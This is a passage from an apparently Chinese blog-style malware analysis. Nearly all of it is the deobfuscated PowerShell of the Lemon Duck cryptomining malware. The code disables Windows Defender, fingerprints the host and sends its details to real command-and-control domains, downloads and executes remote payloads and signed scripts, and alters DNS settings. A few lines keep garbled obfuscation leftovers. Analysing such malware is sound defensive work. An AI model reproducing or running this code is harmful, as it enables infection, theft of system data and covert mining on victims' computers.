class="line">7kMnib.fi7kM=nibfiV6qOp+qOpC&#x27;+&#x27;</span><br><span class="line"></span><br><span class="line">&#125;eurtV6C=46siV6C&#123;)8 qe- eziS::]rtPtnI[qOp+qOp(fiqOp(( &#x27;(&quot; ); [STRInG]::JoiN(&#x27;&#x27; , $q2g4H[ -1 ..- ($q2g4H.LenGTH) ]) |&amp;( $pshOme[21]+$PShomE[30]+&#x27;x&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>翻转+去混淆如下</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>([<span class="built_in">Int</span><span class="type">Ptr</span>]::Size <span class="operator">-eq</span> <span class="number">8</span>)&#123;<span class="variable">$is64</span>=<span class="variable">$true</span>&#125;</span><br><span class="line"><span class="variable">$ifbin</span>=<span class="string">&quot;if.bin&quot;</span></span><br><span class="line"><span class="variable">$ifmd5</span>=<span class="string">&quot;85a6b73fd5b08e0330c10f1e8f8d1158&quot;</span></span><br><span class="line"><span class="variable">$krbin</span>=<span class="string">&quot;kr.bin&quot;</span></span><br><span class="line"><span class="variable">$krmd5</span>=<span class="string">&quot;e04acec7ab98362d87d1c53d84fc4b03&quot;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$is64</span>)&#123;</span><br><span class="line"><span class="variable">$mbin</span>=<span class="string">&quot;m6.bin&quot;</span></span><br><span class="line"><span class="variable">$mmd5</span>=<span class="string">&quot;dcd9144d509e7c6e1e63ecdd7e50e935&quot;</span></span><br><span class="line"><span class="variable">$mgbin</span>=<span class="string">&quot;m6g.bin&quot;</span></span><br><span class="line"><span class="variable">$mgmd5</span>=<span class="string">&quot;c8242bffbaf1f76085f140e5a7552692&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gmd5</span><span class="params">(<span class="variable">$d</span>)</span></span>&#123;</span><br><span class="line">[<span class="type">Security.Cryptography.MD5</span>]::Create().ComputeHash(<span class="variable">$d</span>)|<span class="keyword">foreach</span>&#123;<span class="variable">$l</span>+=<span class="variable">$_</span>.ToString(<span class="string">&#x27;x2&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$l</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getrname</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="variable">$rpath</span>=<span class="string">&quot;C:\Windows\System32\Windowspowershell\V1.0&quot;</span></span><br><span class="line">    <span class="variable">$enames</span> = <span class="built_in">gci</span> <span class="string">&quot;<span class="variable">$rpath</span>\*&quot;</span> <span class="literal">-Include</span> *.exe <span class="literal">-Exclude</span> powershell.exe|<span class="keyword">foreach</span>&#123;<span class="variable">$_</span>.name&#125;</span><br><span class="line">    <span class="variable">$tmd5</span> = gmd5 ([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;<span class="variable">$rpath</span>\powershell.exe&quot;</span>))</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$ename</span> <span class="keyword">in</span> <span class="variable">$enames</span>)&#123;</span><br><span class="line">        <span class="variable">$md5_</span>=gmd5 ([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;<span class="variable">$rpath</span>\<span class="variable">$ename</span>&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$tmd5</span> <span class="operator">-eq</span> <span class="variable">$md5_</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ename</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ename</span>=<span class="operator">-join</span>([<span class="built_in">char</span>[]](<span class="number">48</span>..<span class="number">57</span>+<span class="number">65</span>..<span class="number">90</span>+<span class="number">97</span>..<span class="number">122</span>)|<span class="built_in">Get-Random</span> <span class="literal">-Count</span> (<span class="number">6</span>+(<span class="built_in">Get-Random</span>)%<span class="number">6</span>)) + <span class="string">&quot;.exe&quot;</span></span><br><span class="line">    <span class="built_in">copy-item</span> <span class="string">&quot;<span class="variable">$rpath</span>\powershell.exe&quot;</span> <span class="string">&quot;<span class="variable">$rpath</span>\<span class="variable">$ename</span>&quot;</span>|<span class="built_in">out-null</span></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="built_in">test-path</span> <span class="string">&quot;<span class="variable">$rpath</span>\<span class="variable">$ename</span>&quot;</span>))&#123;<span class="variable">$ename</span>=<span class="string">&quot;powershell.exe&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ename</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rename</span>=getrname</span><br><span class="line"><span class="variable">$lifmd5</span>,<span class="variable">$lmmd5</span>,<span class="variable">$lkrmd5</span>=<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$lifmd5</span>=gmd5 ([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;<span class="variable">$env:tmp</span>\<span class="variable">$ifbin</span>&quot;</span>))&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$lmmd5</span>=gmd5 ([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;<span class="variable">$env:tmp</span>\<span class="variable">$mbin</span>&quot;</span>))&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$lkrmd5</span>=gmd5 ([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;<span class="variable">$env:tmp</span>\<span class="variable">$krbin</span>&quot;</span>))&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="variable">$down_url</span> = <span class="string">&quot;http://d.ackng.com&quot;</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$url</span>)&#123;<span class="variable">$url</span>=<span class="string">&quot;http://t.amynx.com&quot;</span>&#125;</span><br><span class="line"><span class="variable">$core_url</span> = <span class="variable">$url</span>.split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span><span class="type">..2</span>]<span class="operator">-join</span><span class="string">&quot;/&quot;</span></span><br><span class="line"><span class="variable">$permit</span> = ([<span class="type">Security.Principal.WindowsPrincipal</span>][<span class="type">Security.Principal.WindowsIdentity</span>]::GetCurrent()).IsInRole([<span class="type">Security.Principal.WindowsBuiltInRole</span>] <span class="string">&quot;Administrator&quot;</span>)</span><br><span class="line"><span class="variable">$comp_name</span> = <span class="variable">$env:COMPUTERNAME</span></span><br><span class="line"><span class="variable">$guid</span> = (<span class="built_in">get-wmiobject</span> Win32_ComputerSystemProduct).UUID</span><br><span class="line"><span class="variable">$mac</span> = (<span class="built_in">Get-WmiObject</span> Win32_NetworkAdapterConfiguration diQ <span class="built_in">where</span> &#123;<span class="variable">$_</span>.ipenabled <span class="operator">-EQ</span> <span class="variable">$true</span>&#125;).Macaddress | <span class="built_in">select-object</span> <span class="literal">-first</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$osb</span> = (<span class="built_in">Get-WmiObject</span> <span class="literal">-class</span> Win32_OperatingSystem)</span><br><span class="line"><span class="variable">$os</span> = <span class="variable">$osb</span>.Caption.replace(<span class="string">&quot;Microsoft Windows &quot;</span>,<span class="string">&quot;&quot;</span>)+<span class="string">&quot;_&quot;</span>+<span class="variable">$osb</span>.Version</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$env:USERNAME</span></span><br><span class="line"><span class="variable">$domain</span> = (<span class="built_in">Get-WmiObject</span> win32_computersystem).Domain</span><br><span class="line"><span class="variable">$uptime</span> = [<span class="type">timespan</span>]::FromMilliseconds([<span class="type">environment</span>]::TickCount)|<span class="keyword">foreach</span>&#123;<span class="variable">$_</span>.totalseconds&#125;</span><br><span class="line"><span class="variable">$card</span> = (<span class="built_in">Get-WmiObject</span> Win32_VideoController).name</span><br><span class="line"><span class="built_in">gwmi</span> Win32_PhysicalMemory | %&#123;<span class="variable">$msum</span> = <span class="number">0</span>&#125; &#123; <span class="variable">$msum</span> += <span class="variable">$_</span>.Capacity &#125;;</span><br><span class="line"><span class="variable">$mem</span>=<span class="variable">$msum</span>/<span class="number">1</span>Gb</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$drive</span> = ([<span class="type">system.IO.DriveInfo</span>]::GetDrives() | <span class="built_in">where</span> &#123;<span class="variable">$_</span>.IsReady <span class="operator">-and</span> (<span class="variable">$_</span>.AvailableFreeSpace <span class="operator">-gt</span> <span class="number">1024</span>) <span class="operator">-and</span> ((<span class="variable">$_</span>.DriveType <span class="operator">-eq</span> <span class="string">&quot;Removable&quot;</span>) <span class="operator">-or</span> (<span class="variable">$_</span>.DriveType <span class="operator">-eq</span> <span class="string">&quot;Network&quot;</span>)) <span class="operator">-and</span> ((<span class="variable">$_</span>.DriveFormat <span class="operator">-eq</span> <span class="string">&quot;NTFS&quot;</span>) <span class="operator">-or</span> (<span class="variable">$_</span>.DriveFormat <span class="operator">-eq</span> <span class="string">&quot;FAT32&quot;</span>))&#125; | <span class="keyword">foreach</span>&#123;(<span class="variable">$_</span>.Name)[<span class="number">0</span>]+<span class="string">&quot;_&quot;</span>+(<span class="variable">$_</span>.DriveType.tostring())[<span class="number">0</span>]&#125;)<span class="operator">-join</span><span class="string">&quot;|&quot;</span>&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="variable">$timestamp</span> = (<span class="built_in">Get-Date</span> <span class="literal">-UFormat</span> <span class="string">&quot;%s&quot;</span>).Substring(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">[<span class="type">Reflection.Assembly</span>]::LoadWithPartialName(<span class="string">&quot;System.Web.Extensions&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span> = (<span class="built_in">New-Object</span> Web.Script.Serialization.JavaScriptSerializer).DeserializeObject((<span class="built_in">new-object</span> net.webclient).<span class="string">&quot;downloadstring&quot;</span>(<span class="string">&#x27;http://127.0.0.1:43669/1/summary&#x27;</span>))</span><br><span class="line"><span class="variable">$mv</span>=<span class="variable">$obj</span>.version</span><br><span class="line"><span class="variable">$mip</span>=<span class="variable">$obj</span>.connection.ip</span><br><span class="line"><span class="variable">$mhr</span>=<span class="variable">$obj</span>.hashrate.total<span class="operator">-join</span>(<span class="string">&#x27;,&#x27;</span>)&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="number">1</span></span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionPath</span> c:\</span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionProcess</span> c:\windows\system32y3dWindowsPowerShell\v1.<span class="number">0</span>\powershell.exe</span><br><span class="line">    <span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionProcess</span> c:\windows\system32\WindowsPowerShell\v1.<span class="number">0</span>\<span class="variable">$rename</span></span><br><span class="line">&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$card</span> <span class="operator">-match</span> <span class="string">&quot;GTX|NVIDIA|GEFORCE&quot;</span>))&#123;<span class="variable">$isn</span>=<span class="number">1</span>&#125;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$card</span> <span class="operator">-match</span> <span class="string">&quot;RadeondiQAMD&quot;</span>))&#123;<span class="variable">$isa</span>=<span class="number">1</span>&#125;</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$url</span>.split(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="variable">$params</span>=<span class="selector-tag">@</span>(<span class="variable">$v</span>,<span class="variable">$comp_name</span>,<span class="variable">$guid</span>,<span class="variable">$mac</span>)<span class="operator">-join</span><span class="string">&quot;&amp;&quot;</span></span><br><span class="line"><span class="built_in">set-location</span> <span class="variable">$env:tmp</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stp</span><span class="params">(<span class="variable">$gra</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">write-host</span> <span class="variable">$gra</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> cmd.exe <span class="literal">-ArgumentList</span> <span class="string">&quot;/c <span class="variable">$gra</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gcf</span><span class="params">(<span class="variable">$code</span>,<span class="variable">$md</span>,<span class="variable">$fn</span>)</span></span>&#123;</span><br><span class="line">(<span class="string">&#x27;echo &#x27;</span>+<span class="variable">$code</span>+<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">    $ifmd5=&#x27;</span>UB6<span class="string">&#x27;+$md+&#x27;</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ifp</span>=<span class="variable">$env:tmp</span>+<span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;+$fn+&#x27;</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$down_url</span>=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;+$down_url+&#x27;</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gmd5</span><span class="params">(<span class="variable">$con</span>)</span></span>&#123;[<span class="type">System.Security.Cryptography.MD5</span>]::Create().ComputeHash(<span class="variable">$con</span>)|<span class="keyword">foreach</span>&#123;<span class="variable">$s</span>+=<span class="variable">$_</span>.ToString(<span class="string">&#x27;&#x27;</span>x2<span class="string">&#x27;&#x27;</span>)&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>&#125;<span class="keyword">if</span>(<span class="built_in">test-path</span> <span class="variable">$ifp</span>)&#123;<span class="variable">$con_</span>=[<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="variable">$ifp</span>);</span><br><span class="line">    <span class="variable">$md5_</span>=gmd5 <span class="variable">$con_</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$md5_</span><span class="operator">-eq</span><span class="variable">$ifmd5</span>)&#123;<span class="variable">$noup</span>=<span class="number">1</span>&#125;&#125;<span class="keyword">if</span>(!<span class="variable">$noup</span>)&#123;<span class="variable">$con</span>=(<span class="built_in">New-Object</span> Net.WebClient).downloaddata(<span class="variable">$down_url</span>+<span class="string">&#x27;&#x27;</span>/<span class="string">&#x27;+$fn+&#x27;</span>?<span class="string">&#x27;+$params+&#x27;</span><span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$t</span>=gmd5 <span class="variable">$con</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$t</span><span class="operator">-eq</span><span class="variable">$ifmd5</span>)&#123;[<span class="type">System.IO.File</span>]::WriteAllBytes(<span class="variable">$ifp</span>,<span class="variable">$con</span>)&#125;<span class="keyword">else</span>&#123;<span class="variable">$noup</span>=<span class="number">1</span>&#125;&#125;<span class="keyword">if</span>(<span class="variable">$noup</span>)&#123;<span class="variable">$con</span>=<span class="variable">$con_</span>;</span><br><span class="line">    <span class="variable">$ifmd5</span>=<span class="variable">$md5_</span>&#125;<span class="string">&#x27;).replace(UB6|&#x27;</span>,UB6^^^|<span class="string">&#x27;).replace(&#x27;</span>&amp;<span class="string">&#x27;,&#x27;</span>^^^&amp;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function gpa($fnam,$name)&#123;</span></span><br><span class="line"><span class="string">(&#x27;</span><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$con</span>.count<span class="literal">-1</span>;</span><br><span class="line">    <span class="variable">$i</span>+=<span class="number">1</span>)&#123;<span class="keyword">if</span>(<span class="variable">$con</span>[<span class="variable">$i</span>] <span class="operator">-eq</span> <span class="number">0</span>x0a)&#123;<span class="keyword">break</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">iex</span>(<span class="operator">-join</span>[<span class="built_in">char</span>[]]<span class="variable">$con</span>[<span class="number">0</span><span class="type">..</span><span class="variable">$i</span>]);</span><br><span class="line">    <span class="variable">$bin</span>=(<span class="built_in">New-Object</span> IO.BinaryReader(<span class="built_in">New-Object</span> System.IO.Compression.GzipStream (<span class="built_in">New-Object</span> System.IO.MemoryStream(,<span class="variable">$con</span>[(<span class="variable">$i</span>+<span class="number">1</span>)<span class="type">..</span>(<span class="variable">$con</span><span class="type">.count</span>)])), ([<span class="type">IO.Compression.CompressionMode</span>]::Decompress))).ReadBytes(<span class="number">10000000</span>);</span><br><span class="line">    <span class="variable">$bin_</span>=<span class="variable">$bin</span>.Clone();</span><br><span class="line">    <span class="variable">$mep</span>=<span class="variable">$env:tmp</span>+<span class="string">&#x27;&#x27;</span><span class="string">&#x27;+&quot;\$fnam.ori&quot;+&#x27;</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    [<span class="type">System.IO.File</span>]::WriteAllBytes(<span class="variable">$mep</span>,<span class="variable">$bin_</span>+((<span class="number">1</span>..<span class="number">127</span>)|<span class="built_in">Get-Random</span> <span class="literal">-Count</span> <span class="number">100</span>));</span><br><span class="line">    test1 <span class="literal">-PEBytes</span> <span class="variable">$bin</span><span class="string">&#x27;).replace(&#x27;</span>|<span class="string">&#x27;,&#x27;</span>^^^diQ<span class="string">&#x27;).replace(&#x27;</span>&amp;<span class="string">&#x27;,&#x27;</span>^^^&amp;<span class="string">&#x27;)+&quot;|$name - &amp;cmd /c copy /y %tmp%\$fnam.ori %tmp%\$fnam.exe &amp; %tmp%\$fnam.exe&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function gpb($name)&#123;</span></span><br><span class="line"><span class="string">    IEX(-join[char[]]$con)|&#x27;</span>+<span class="variable">$name</span>+<span class="string">&#x27; -&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gcode</span><span class="params">(<span class="variable">$fl</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$local</span>+<span class="variable">$fl</span>+=<span class="variable">$flase</span>;</span><br><span class="line">    <span class="built_in">New-Object</span> Threading.Mutex(<span class="variable">$true</span>,<span class="string">&#x27;&#x27;</span>Global\eLocal<span class="string">&#x27;+$fl+&#x27;</span><span class="string">&#x27;&#x27;</span>,[<span class="type">ref</span>]<span class="variable">$local</span><span class="string">&#x27;+$fl+&#x27;</span>)&#125;<span class="keyword">catch</span>&#123;&#125;UB6</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$code1</span>=gcode <span class="string">&quot;If&quot;</span></span><br><span class="line"><span class="built_in">IEx</span> <span class="variable">$code1</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$localIf</span>)&#123;</span><br><span class="line">stp ((gcf <span class="variable">$code1</span> <span class="variable">$ifmd5</span> <span class="variable">$ifbin</span>)+(gpb <span class="variable">$rename</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$is64</span>)&#123;</span><br><span class="line"><span class="variable">$code2</span>=gcode <span class="string">&quot;TMn&quot;</span></span><br><span class="line"><span class="built_in">IEx</span> <span class="variable">$code2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$localTMn</span>)&#123;</span><br><span class="line">stp ((gcf <span class="variable">$code2</span> <span class="variable">$mmd5</span> <span class="variable">$mbin</span>)+(gpa <span class="variable">$mbin</span> <span class="variable">$rename</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$isn</span> <span class="operator">-or</span> <span class="variable">$isa</span>) <span class="operator">-and</span> <span class="variable">$is64</span>)&#123;</span><br><span class="line"><span class="variable">$code3</span>=gcode <span class="string">&quot;TMng&quot;</span></span><br><span class="line"><span class="built_in">IEx</span> <span class="variable">$code3</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$localTMng</span>)&#123;</span><br><span class="line">stp ((gcf <span class="variable">$code3</span> <span class="variable">$mgmd5</span> <span class="variable">$mgbin</span>)+(gpa <span class="variable">$mgbin</span> <span class="variable">$rename</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$code4</span>=gcode <span class="string">&quot;Kr&quot;</span></span><br><span class="line"><span class="built_in">IEx</span> <span class="variable">$code4</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$localKr</span>)&#123;</span><br><span class="line">stp ((gcf <span class="variable">$code4</span> <span class="variable">$krmd5</span> <span class="variable">$krbin</span>)+(gpb <span class="variable">$rename</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;(<span class="built_in">get-wmiobject</span> <span class="literal">-class</span> win32_networkadapterconfiguration <span class="literal">-filter</span> ipenabled=true).SetDNSServerSearchOrder(<span class="selector-tag">@</span>(<span class="string">&#x27;8.8.8.8&#x27;</span>,<span class="string">&#x27;9.9.9.9&#x27;</span>))&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="variable">$params</span>+=<span class="string">&quot;&amp;&quot;</span>+(<span class="selector-tag">@</span>(<span class="variable">$os</span>,[<span class="built_in">Int</span>]<span class="variable">$is64</span>,<span class="variable">$user</span>,<span class="variable">$domain</span>,<span class="variable">$drive</span>,<span class="variable">$card</span>,<span class="variable">$mem</span>,[<span class="built_in">Int</span>]<span class="variable">$permit</span>,(<span class="variable">$lifmd5</span>[<span class="number">0</span><span class="type">..5</span>]<span class="operator">-join</span><span class="string">&quot;&quot;</span>),(<span class="variable">$lmmd5</span>[<span class="number">0</span><span class="type">..5</span>]<span class="operator">-join</span><span class="string">&quot;&quot;</span>),(<span class="variable">$lkrmd5</span>[<span class="number">0</span><span class="type">..5</span>]<span class="operator">-join</span><span class="string">&quot;&quot;</span>),<span class="variable">$mv</span>,<span class="variable">$mip</span>,<span class="variable">$mhr</span>,<span class="variable">$uptime</span>,<span class="variable">$timestamp</span>,<span class="string">&quot;0.4&quot;</span>)<span class="operator">-join</span><span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SIEX</span></span> &#123;  </span><br><span class="line"><span class="keyword">Param</span>(</span><br><span class="line">[<span class="built_in">string</span>]<span class="variable">$url</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$webclient</span> = <span class="built_in">New-Object</span> Net.WebClient</span><br><span class="line"><span class="variable">$finalurl</span> = <span class="string">&quot;<span class="variable">$url</span>&quot;</span>+<span class="string">&quot;?&quot;</span>+<span class="string">&quot;<span class="variable">$params</span>&quot;</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$webclient</span>.Headers.add(<span class="string">&quot;User-Agent&quot;</span>,<span class="string">&quot;Lemon-Duck-&quot;</span>+<span class="variable">$Lemon_Duck</span>.replace(<span class="string">&#x27;y3d&#x27;</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">&#125; <span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="variable">$res_bytes</span> = <span class="variable">$webclient</span>.DownloadData(<span class="variable">$finalurl</span>)</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res_bytes</span>.count <span class="operator">-gt</span> <span class="number">173</span>)&#123;</span><br><span class="line"><span class="variable">$sign_bytes</span> = <span class="variable">$res_bytes</span>[<span class="number">0</span><span class="type">..171</span>];</span><br><span class="line"><span class="variable">$raw_bytes</span> = <span class="variable">$res_bytes</span>[<span class="number">173</span><span class="type">..</span><span class="variable">$res_bytes</span><span class="type">.count</span>];</span><br><span class="line"><span class="variable">$rsaParams</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.RSAParameters</span><br><span class="line"><span class="variable">$rsaParams</span>.Modulus = <span class="number">0</span>xda,<span class="number">0</span>x65,<span class="number">0</span>xa8,<span class="number">0</span>xd7,<span class="number">0</span>xbb,<span class="number">0</span>x97,<span class="number">0</span>xbc,<span class="number">0</span>x6d,<span class="number">0</span>x41,<span class="number">0</span>x5e,<span class="number">0</span>x99,<span class="number">0</span>x9d,<span class="number">0</span>x82,<span class="number">0</span>xff,<span class="number">0</span>x2f,<span class="number">0</span>xff,<span class="number">0</span>x73,<span class="number">0</span>x53,<span class="number">0</span>x9a,<span class="number">0</span>x73,<span class="number">0</span>x6e,<span class="number">0</span>x6c,<span class="number">0</span>x7b,<span class="number">0</span>x55,<span class="number">0</span>xeb,<span class="number">0</span>x67,<span class="number">0</span>xd6,<span class="number">0</span>xae,<span class="number">0</span>x4e,<span class="number">0</span>x23,<span class="number">0</span>x3c,<span class="number">0</span>x52,<span class="number">0</span>x3d,<span class="number">0</span>xc0,<span class="number">0</span>xcd,<span class="number">0</span>xcd,<span class="number">0</span>x37,<span class="number">0</span>x6b,<span class="number">0</span>xf3,<span class="number">0</span>x4f,<span class="number">0</span>x3b,<span class="number">0</span>x62,<span class="number">0</span>x70,<span class="number">0</span>x86,<span class="number">0</span>x07,<span class="number">0</span>x96,<span class="number">0</span>x6e,<span class="number">0</span>xca,<span class="number">0</span>xde,<span class="number">0</span>xbd,<span class="number">0</span>xa6,<span class="number">0</span>x4f,<span class="number">0</span>xf6,<span class="number">0</span>x11,<span class="number">0</span>xd1,<span class="number">0</span>x60,<span class="number">0</span>xdc,<span class="number">0</span>x88,<span class="number">0</span>xbf,<span class="number">0</span>x35,<span class="number">0</span>xf2,<span class="number">0</span>x92,<span class="number">0</span>xee,<span class="number">0</span>x6c,<span class="number">0</span>xb8,<span class="number">0</span>x2e,<span class="number">0</span>x9b,<span class="number">0</span>x7d,<span class="number">0</span>x2b,<span class="number">0</span>xd1,<span class="number">0</span>x19,<span class="number">0</span>x30,<span class="number">0</span>x73,<span class="number">0</span>xc6,<span class="number">0</span>x52,<span class="number">0</span>x01,<span class="number">0</span>xcd,<span class="number">0</span>xe7,<span class="number">0</span>xc7,<span class="number">0</span>x34,<span class="number">0</span>x78,<span class="number">0</span>x8a,<span class="number">0</span>xa7,<span class="number">0</span>x9f,<span class="number">0</span>xe2,<span class="number">0</span>x12,<span class="number">0</span>xcd,<span class="number">0</span>x79,<span class="number">0</span>x40,<span class="number">0</span>xa7,<span class="number">0</span>x91,<span class="number">0</span>x6a,<span class="number">0</span>xae,<span class="number">0</span>x95,<span class="number">0</span>x8e,<span class="number">0</span>x42,<span class="number">0</span>xd0,<span class="number">0</span>xcf,<span class="number">0</span>x39,<span class="number">0</span>x6e,<span class="number">0</span>x30,<span class="number">0</span>xcb,<span class="number">0</span>x0a,<span class="number">0</span>x98,<span class="number">0</span>xdb,<span class="number">0</span>x97,<span class="number">0</span>x3f,<span class="number">0</span>xf6,<span class="number">0</span>x2e,<span class="number">0</span>x95,<span class="number">0</span>x10,<span class="number">0</span>x72,<span class="number">0</span>xfd,<span class="number">0</span>x63,<span class="number">0</span>xd5,<span class="number">0</span>xf7,<span class="number">0</span>x88,<span class="number">0</span>x63,<span class="number">0</span>xa4,<span class="number">0</span>x7b,<span class="number">0</span>xae,<span class="number">0</span>x97,<span class="number">0</span>xea,<span class="number">0</span>x38,<span class="number">0</span>xb7,<span class="number">0</span>x47,<span class="number">0</span>x6b,<span class="number">0</span>x5d</span><br><span class="line"><span class="variable">$rsaParams</span>.Exponent = <span class="number">0</span>x01,<span class="number">0</span>x00,<span class="number">0</span>x01</span><br><span class="line"><span class="variable">$rsa</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Security.Cryptography.RSACryptoServiceProvider;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rsa</span>.ImportParameters(<span class="variable">$rsaParams</span>)</span><br><span class="line"><span class="variable">$base64</span> = <span class="operator">-join</span>([<span class="built_in">char</span>[]]<span class="variable">$sign_bytes</span>)</span><br><span class="line"><span class="variable">$byteArray</span> = [<span class="type">convert</span>]::FromBase64String(<span class="variable">$base64</span>)</span><br><span class="line"><span class="variable">$sha1</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.SHA1CryptoServiceProvider</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rsa</span>.verifyData(<span class="variable">$raw_bytes</span>,<span class="variable">$sha1</span>,<span class="variable">$byteArray</span>)) &#123;</span><br><span class="line"><span class="built_in">IEX</span> (<span class="operator">-join</span>[<span class="built_in">char</span>[]]<span class="variable">$raw_bytes</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">SIEX <span class="string">&quot;<span class="variable">$core_url</span>/report.jsp&quot;</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isn</span> <span class="operator">-and</span> <span class="variable">$is64</span>)&#123;</span><br><span class="line"><span class="variable">$nd</span>=<span class="string">&quot;nvd.zip&quot;</span></span><br><span class="line"><span class="variable">$ndg</span>=<span class="string">&quot;<span class="variable">$env:tmp</span>\nvdg.dat&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="built_in">test-path</span> <span class="variable">$ndg</span>) <span class="operator">-or</span> (<span class="built_in">Get-Item</span> <span class="variable">$ndg</span>).length <span class="operator">-ne</span> <span 